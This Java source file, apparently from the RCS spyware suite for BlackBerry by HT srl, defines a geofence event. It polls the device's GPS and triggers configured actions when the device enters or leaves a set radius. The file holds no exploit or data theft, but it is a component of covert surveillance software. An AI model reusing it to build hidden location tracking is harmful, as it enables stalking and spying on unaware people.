//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LocationEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import javax.microedition.location.Coordinates;
import javax.microedition.location.Location;
import javax.microedition.location.QualifiedCoordinates;

import blackberry.Messages;
import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;

/**
 * The Class LocationEvent.
 */
public final class EventLocation extends Event implements LocationObserver {
    private static final long LOCATION_PERIOD = 60000;
    private static final long LOCATION_DELAY = 1000;
    //#ifdef DEBUG
    private static Debug debug = new Debug("LocationEvent", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int distance;
    double latitudeOrig;
    double longitudeOrig;
    Coordinates coordinatesOrig;

    //LocationProvider lp;
    boolean entered = false;

    //int interval = 60;

    public boolean parse(ConfEvent conf) {
        try {
            distance = conf.getInt(Messages.getString("u.1")); //$NON-NLS-1$

            latitudeOrig = (float) conf.getDouble(Messages.getString("u.2")); //$NON-NLS-1$
            longitudeOrig = (float) conf.getDouble(Messages.getString("u.3")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace(" Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            //#endif

            setDelay(LOCATION_DELAY);
            //#ifdef DEBUG
            setPeriod(LOCATION_PERIOD / 10);
            //#else
            setPeriod(LOCATION_PERIOD);
            //#endif
        } catch (final ConfigurationException ex) {
            return false;
        }

        return true;
    }

    protected void actualStart() {

        //#ifdef DEBUG
        debug.trace("setLocationListener"); //$NON-NLS-1$
        //#endif
        //lp.setLocationListener(this, interval, Conf.GPS_TIMEOUT, Conf.GPS_MAXAGE);

        entered = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualLoop() {
        //#ifdef DEBUG
        debug.trace("actualRun"); //$NON-NLS-1$
        //#endif

        if (waitingForPoint) {
            //#ifdef DEBUG
            debug.trace("waitingForPoint"); //$NON-NLS-1$
            //#endif
            return;
        }

        LocationHelper.getInstance().start(this, false);

        //#ifdef DEBUG
        debug.trace("exiting actualRun"); //$NON-NLS-1$
        //#endif
    }

    protected void actualStop() {
        LocationHelper.getInstance().stop(this);
        onExit();
    }

    boolean waitingForPoint = false;

    public void newLocation(Location loc) {
        //#ifdef DEBUG
        debug.trace("checkProximity: " + loc.isValid()); //$NON-NLS-1$
        //#endif

        QualifiedCoordinates coord = null;
        try {
            coord = loc.getQualifiedCoordinates();
            coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                    coord.getAltitude());

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("QualifiedCoordinates: " + ex); //$NON-NLS-1$
            //#endif
            return;

        }

        try {
            final double actualDistance = coord.distance(coordinatesOrig);
            //#ifdef DEBUG
            debug.info("Distance: " + actualDistance); //$NON-NLS-1$
            //#endif
            if (actualDistance < distance) {
                if (!entered) {
                    //#ifdef DEBUG
                    debug.info("Enter"); //$NON-NLS-1$
                    //#endif
                    onEnter();
                    entered = true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already entered"); //$NON-NLS-1$
                    //#endif
                }
            } else {
                if (entered) {
                    //#ifdef DEBUG
                    debug.info("Exit"); //$NON-NLS-1$
                    //#endif
                    onExit();
                    entered = false;
                } else {
                    //#ifdef DEBUG
                    debug.trace("Already exited"); //$NON-NLS-1$
                    //#endif
                }
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("Distance: " + ex); //$NON-NLS-1$
            //#endif
            return;
        }
    }

    public void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    public void errorLocation(boolean interrupted) {
        //#ifdef DEBUG
        debug.error("errorLocation"); //$NON-NLS-1$
        //#endif
        waitingForPoint(false);
    }

}
